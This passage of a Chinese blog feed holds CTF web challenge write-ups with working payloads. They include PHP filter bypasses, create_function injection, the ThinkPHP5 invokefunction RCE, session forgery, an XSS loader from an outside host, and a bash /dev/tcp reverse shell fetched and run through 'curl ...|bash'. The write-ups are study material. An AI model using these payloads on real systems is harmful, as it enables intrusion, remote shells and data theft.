&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据Ying师傅博客写的这里用浮点数精度的问题就可以绕过</span></span><br><span class="line">payload:num=<span class="number">1000000000000000.00000000000000010</span></span><br></pre></td></tr></table></figure><p>第二层</p><p>MD5硬碰</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mport hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>**<span class="number">33</span>):</span><br><span class="line">    i = str(i)</span><br><span class="line">    num = <span class="string">'0e'</span> + i</span><br><span class="line">    md5 = hashlib.md5(num.encode()).hexdigest()</span><br><span class="line">    md5 = hashlib.md5(md5.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(md5)</span></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():</span><br><span class="line">        print(<span class="string">'success str:&#123;&#125;  md5(str):&#123;&#125;'</span>.format(num, md5))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> int(i) % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">         print(i)</span><br><span class="line">//结果：<span class="number">0e1138100474</span></span><br></pre></td></tr></table></figure><p>第三层</p><p>ban了很多命令，这里可以用\斜杠来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flag=ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure><p>所以payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure><p>在网页源码处找到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;36D杯&quot;&gt;&lt;a href=&quot;#36D杯&quot; class=&quot;headerlink&quot; title=&quot;36D杯&quot;&gt;&lt;/a&gt;36D杯&lt;/h1&gt;
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>XMCTF</title>
    <link href="http://yoursite.com/2020/04/29/XMCTF/"/>
    <id>http://yoursite.com/2020/04/29/XMCTF/</id>
    <published>2020-04-29T07:25:44.000Z</published>
    <updated>2020-05-08T10:01:46.710Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-EASY-WEB1"><a href="#0x01-EASY-WEB1" class="headerlink" title="0x01:EASY_WEB1"></a>0x01:EASY_WEB1</h3><a id="more"></a><p>直接给了源码，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure><p>变量覆盖,extract($_POST)打开了全局变量POST，可以用post的值来覆盖key绕过第一个条件，后面的正则匹配通过查资料发现是一个创建函数</p><p>payload:?act=\create_function&amp;arg=){}var_dump(scandir(‘../‘));//</p><p>相当于是function xxx(arg){}=function(){var_dump(scandir(‘../‘));}//){},后面的两个斜杠注释了后面的内容，这样函数就完整了</p><img src="/2020/04/29/XMCTF/1.png" class="" title="examplename"><p>可以看到有”ffflll4g”文件，读取文件就可以了</p><h4 id="0X02：WEB7"><a href="#0X02：WEB7" class="headerlink" title="0X02：WEB7"></a>0X02：WEB7</h4><p>打开地址，源码给了，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//大小写字母和数字都被过滤了，考虑用编码进行绕过，之前碰到过用取反再url编码可以绕过</span></span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//通过传一个中间变量$_,在通过$_()调用getFlag()方法读取，这里相当于是code=$_=getFlag;getFlag();</span></span><br></pre></td></tr></table></figure><p>payload：?code=$<em>=~%98%9A%8B%B9%93%9E%98;$</em>();相当于是code=$_=getFlag;getFlag();</p><h4 id="0X03-WEB4"><a href="#0X03-WEB4" class="headerlink" title="0X03:WEB4"></a>0X03:WEB4</h4><p>打开题目给了一串key：e086aa137fa19f67d27b39d0eca18610，MD5解密一下，是一串ip地址，1.1.1.1,用burp抓包伪造ip</p><img src="/2020/04/29/XMCTF/2.png" class="" title="examplename"><p>访问dhudndrgrhs.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]); </span><br><span class="line"><span class="comment">//几乎所有的远程命令执行漏洞都被ban了，这里可以利用php的字符串拼接，拼接命令来绕过正则</span></span><br><span class="line">payload=$a=<span class="string">'sys'</span>.<span class="string">'tem'</span>;$a(<span class="string">'cat flag.php'</span>);</span><br><span class="line">可以看到flag.php文件，读取，在网页源码处发现flag</span><br></pre></td></tr></table></figure><h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class="" title="examplename"><p>可以看到提示是thinkphp5版本，直接上payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php？s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo();</span><br></pre></td></tr></table></figure><img src="/2020/04/29/XMCTF/4.png" class="" title="examplename"><p>成功回显phpinfo页面，下面就可以爆目录文件了</p><img src="/2020/04/29/XMCTF/5.png" class="" title="examplename"><p>在根目录下找到了flag文件，直接读取 system(“cat /flag”)即可</p><h4 id="0X05-webEASYSESSION"><a href="#0X05-webEASYSESSION" class="headerlink" title="0X05:webEASYSESSION"></a>0X05:webEASYSESSION</h4><p>给了源码，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">'content'</span>] ? <span class="string">"---mylocalnote---\n"</span> . $_GET[<span class="string">'content'</span>] : <span class="string">""</span>;</span><br><span class="line">$name = @$_GET[<span class="string">'name'</span>] ? $_GET[<span class="string">'name'</span>] : <span class="string">''</span>;</span><br><span class="line">str_replace(<span class="string">'/'</span>, <span class="string">''</span>, $name);</span><br><span class="line">str_replace(<span class="string">'\\'</span>, <span class="string">''</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">"/tmp/"</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Thank u,&#123;$_SESSION['username']&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure><p>下面是有关session的知识点找到东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session反序列化</span><br><span class="line">PHP使用文件存储Session信息。因此如果我们把Session文件替换了，写入admin信息，那么Flag就会出来了。PHP的Session文件以”sess_”开头，后接Session ID，Session ID仅有[A-Za-z0-9-0]构成。Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。这种情况下，Session文件的内容为(属性名)|(序列化数据)。在访问Session数据的时候，PHP会自动反序列化相应数据。那么，我们构造Note的标题名为”|N;admin|b:1;”。这样反序列化的结果就是admin&#x3D;&#x3D;bool(true)。我们就伪造了admin身份。而我们访问的时候，通过传递Cookie的值PHPSESSID为我们想要的Session ID，PHP就会去反序列化相应的Session文件。</span><br></pre></td></tr></table></figure><p>payload:?content=|N;username|s:5:%22admin%22;&amp;name=sess_p4c8k2sf8gkv0bb9j8uu6r7d99</p><p>成功写入名为username=admin的sessionID<br>再访问flag.php，传上cookie即可</p><h4 id="0X06禁止套娃"><a href="#0X06禁止套娃" class="headerlink" title="0X06禁止套娃"></a>0X06禁止套娃</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">flag在哪里呢？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//无参RCE</span></span><br><span class="line"><span class="comment">//localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span></span><br><span class="line"><span class="comment">//scandir() 列出 images 目录中的文件和目录。</span></span><br><span class="line"><span class="comment">//readfile() 输出一个文件。</span></span><br><span class="line"><span class="comment">//current() 返回数组中的当前单元, 默认取第一个值。</span></span><br><span class="line"><span class="comment">//pos() current() 的别名。</span></span><br><span class="line"><span class="comment">//next() 函数将内部指针指向数组中的下一个元素，并输出。</span></span><br><span class="line"><span class="comment">//array_reverse()以相反的元素顺序返回数组。</span></span><br><span class="line"><span class="comment">//highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-EASY-WEB1&quot;&gt;&lt;a href=&quot;#0x01-EASY-WEB1&quot; class=&quot;headerlink&quot; title=&quot;0x01:EASY_WEB1&quot;&gt;&lt;/a&gt;0x01:EASY_WEB1&lt;/h3&gt;
    
    </summary>
    
    
    
      <category term="xm" scheme="http://yoursite.com/tags/xm/"/>
    
  </entry>
  
  <entry>
    <title>BJD2MRCTF</title>
    <link href="http://yoursite.com/2020/03/29/BJD2MRCTF/"/>
    <id>http://yoursite.com/2020/03/29/BJD2MRCTF/</id>
    <published>2020-03-29T05:24:57.000Z</published>
    <updated>2020-05-18T15:15:17.558Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MR"><a href="#MR" class="headerlink" title="MR"></a>MR</h2><a id="more"></a><h4 id="0X01-套娃"><a href="#0X01-套娃" class="headerlink" title="0X01: 套娃"></a>0X01: 套娃</h4><p>访问题目地址，页面没有什么有用的信息，查看网页源码，找到信息</p><img src="/2020/03/29/BJD2MRCTF/MR1.png" class="" title="examplename"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span><span class="comment">//这里相当于substr_count($query, '_') === 0 &amp;&amp; substr_count($query, '%5f') == 0</span></span><br><span class="line">这里坑可能是出题人不小心没有打上对于$query传值的方式，后来去百度的时候发现是有一个变量$q_w_q用_GET来传值的，这里对<span class="string">'_'</span>进行了限制，可以用php的特性用.来替代</span><br><span class="line">($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>])<span class="comment">//这里可以用%0a绕过</span></span><br><span class="line"> payload：?b.u.p.t=<span class="number">23333</span>%<span class="number">0</span>a&amp;q.w.q=ls</span><br></pre></td></tr></table></figure><p>爆出下一步路径</p><img src="/2020/03/29/BJD2MRCTF/MR2.png" class="" title="examplename"><p>访问，暂时没有有用的信息，还是查看源码，发现一段jsfuck加密的密文，解密：post me Merak</p><p>用burp来进行post传Merak，爆出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//直接说一下构造payload的思路</span></span><br><span class="line"><span class="number">1.</span>ip===<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>构造伪IP地址，刚开始想到的是X-Forwarded-<span class="keyword">For</span>,发现不行，想到了之前比赛收集的类似的伪构造，client-IP可用</span><br><span class="line"><span class="number">2.</span>file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> 用php伪协议php:<span class="comment">//input可以post数据</span></span><br><span class="line"><span class="number">3.</span>change($_GET[<span class="string">'file'</span>])，我们最后肯定是要读取flag.php的，根据给的加密方式反向解密，推算出$v为fj]a&amp;f\b，在进行base64加密，这里要注意要在本地base64加密，网上的加密有点问题</span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/MR3.png" class="" title="examplename"><h4 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h4><p>文件上传题，尝试过小马之后都失败了，上传一个.htaccess，成功</p><p>再上传小马，成功</p><p>用蚁剑连接，根目录下flag</p><h2 id="BJD"><a href="#BJD" class="headerlink" title="BJD"></a>BJD</h2><h4 id="0X01-old-hacker"><a href="#0X01-old-hacker" class="headerlink" title="0X01:old hacker"></a>0X01:old hacker</h4><img src="/2020/03/29/BJD2MRCTF/old1.png" class="" title="examplename"><p>可以看到提示是thinkphp5的，用exp测试一下，利用报错收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;dir</span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/old2.png" class="" title="examplename"><p>是thinkphp5.2.23版本的，去找一下有关版本的漏洞，找到了可以利用的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=<span class="string">'id'</span></span><br></pre></td></tr></table></figure><p>id是可以控制的，可以直接读取根目录下的flag</p><h4 id="0X02：XSS"><a href="#0X02：XSS" class="headerlink" title="0X02：XSS"></a>0X02：XSS</h4><p>这道题用到的是php可用的反序列化原生类，以下是exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>题目扫一遍发现有git泄露，用Githack拿到源码</p><img src="/2020/03/29/BJD2MRCTF/xss1.png" class="" title="examplename"><p>用上面的方式生成序列化数据进行测试，成功弹窗</p><img src="/2020/03/29/BJD2MRCTF/xss2.png" class="" title="examplename"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script src='http://xss.fbisb.com/xss.php?do=login'&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过上面的运行结果作为payload打，在cookie里可以找到flag</p><h4 id="0X03-Duangshell"><a href="#0X03-Duangshell" class="headerlink" title="0X03:Duangshell"></a>0X03:Duangshell</h4><p>打开题目有提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">how can i give you source code? .swp?!</span><br></pre></td></tr></table></figure><p>访问/.index.php.swp得到源码，用<code>vim -r index.php</code>恢复源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post一个girl_friend然后绕过一些正则比配之后就<code>exec()</code>，<code>exec()</code>和<code>system()</code>不同，<code>exec()</code>无回显，所以要考虑反弹shell，这里curl没有被ban掉</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在web服务目录下创建shell.txt文件，ip和port自己改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">girl_friend=curl http:<span class="comment">//174.1.150.238/shell.txt|bash</span></span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/shell.png" class="" 